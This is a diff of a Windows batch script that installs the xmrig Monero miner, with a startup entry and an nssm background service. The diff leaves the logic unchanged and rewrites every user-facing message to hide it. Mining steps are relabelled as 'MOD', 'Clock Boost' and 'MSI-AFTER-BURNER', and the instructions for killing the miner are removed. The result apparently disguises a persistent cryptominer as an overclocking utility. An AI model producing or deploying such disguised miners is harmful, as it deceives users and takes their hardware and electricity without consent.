@@ -29,7 +29,7 @@ for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
 call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
 if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
 if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
-echo ERROR: Wrong wallet address length (should be 106 or 95): %WALLET_BASE_LEN%
+echo ERROR: Wrong address length (should be 106 or 95): %WALLET_BASE_LEN%
 exit /b 1
 
 :WALLET_LEN_OK
@@ -234,11 +234,11 @@ if exist "%USERPROFILE%\moneroocean\xmrig.exe" (
   echo WARNING: Advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" was removed by antivirus
 )
 
-echo [*] Looking for the latest version of Monero miner
+echo [*] Looking for the latest version of MOD
 for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
 set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"
 
-echo [*] Downloading "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
+echo [*] Downloading CONFIGS
 powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
@@ -246,12 +246,12 @@ if errorlevel 1 (
 )
 
 :REMOVE_DIR1
-echo [*] Removing "%USERPROFILE%\moneroocean" directory
+echo [*] Removing OLD-FILES
 timeout 5
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR1
 
-echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
+echo [*] Unpacking MOD FILES
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\moneroocean')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
@@ -260,10 +260,10 @@ if errorlevel 1 (
     echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
     exit /b 1
   )
-  echo [*] Unpacking advanced "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
+  echo [*] Unpacking advanced 
   "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\xmrig.zip" >NUL
   if errorlevel 1 (
-    echo ERROR: Can't unpack "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
+    echo ERROR: Can't unpack
     exit /b 1
   )
   del "%USERPROFILE%\7za.exe"
@@ -313,8 +313,8 @@ echo if errorlevel 1 goto ALREADY_RUNNING
 echo start /low %%~dp0xmrig.exe %%^*
 echo goto EXIT
 echo :ALREADY_RUNNING
-echo echo Monero miner is already running in the background. Refusing to run another one.
-echo echo Run "taskkill /IM xmrig.exe" if you want to remove background miner first.
+echo echo ALREADY UP
+echo echo STARTUP_DIR
 echo :EXIT
 ) > "%USERPROFILE%\moneroocean\miner.bat"
 
@@ -335,32 +335,32 @@ echo ERROR: Can't find Windows startup directory
 exit /b 1
 
 :STARTUP_DIR_OK
-echo [*] Adding call to "%USERPROFILE%\moneroocean\miner.bat" script to "%STARTUP_DIR%\moneroocean_miner.bat" script
+echo [*] Adding Clock Boost
 (
 echo @echo off
 echo "%USERPROFILE%\moneroocean\miner.bat" --config="%USERPROFILE%\moneroocean\config_background.json"
 ) > "%STARTUP_DIR%\moneroocean_miner.bat"
 
-echo [*] Running miner in the background
+echo [*] Running PIPE
 call "%STARTUP_DIR%\moneroocean_miner.bat"
 goto OK
 
 :ADMIN_MINER_SETUP
 
-echo [*] Downloading tools to make moneroocean_miner service to "%USERPROFILE%\nssm.zip"
+echo [*] Downloading tools For Setup
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download tools to make moneroocean_miner service
   exit /b 1
 )
 
-echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
+echo [*] Unpacking Tools..
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\moneroocean')"
 if errorlevel 1 (
-  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
+  echo [*] Downloading 7za.exe
   powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
   if errorlevel 1 (
-    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
+    echo ERROR: Can't download 7za.exe
     exit /b 1
   )
   echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
@@ -373,12 +373,12 @@ if errorlevel 1 (
 )
 del "%USERPROFILE%\nssm.zip"
 
-echo [*] Creating moneroocean_miner service
+echo [*] Creating MSI-CONFIG
 sc stop moneroocean_miner
 sc delete moneroocean_miner
 "%USERPROFILE%\moneroocean\nssm.exe" install moneroocean_miner "%USERPROFILE%\moneroocean\xmrig.exe"
 if errorlevel 1 (
-  echo ERROR: Can't create moneroocean_miner service
+  echo ERROR: Can't create MSI_CONFIG
   exit /b 1
 )
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppDirectory "%USERPROFILE%\moneroocean"
@@ -386,10 +386,10 @@ if errorlevel 1 (
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStdout "%USERPROFILE%\moneroocean\stdout"
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStderr "%USERPROFILE%\moneroocean\stderr"
 
-echo [*] Starting moneroocean_miner service
+echo [*] Starting MSI-AFTER-BURNER
 "%USERPROFILE%\moneroocean\nssm.exe" start moneroocean_miner
 if errorlevel 1 (
-  echo ERROR: Can't start moneroocean_miner service
+  echo ERROR: Can't start MSI-AFTER-BURNER
   exit /b 1
 )
 
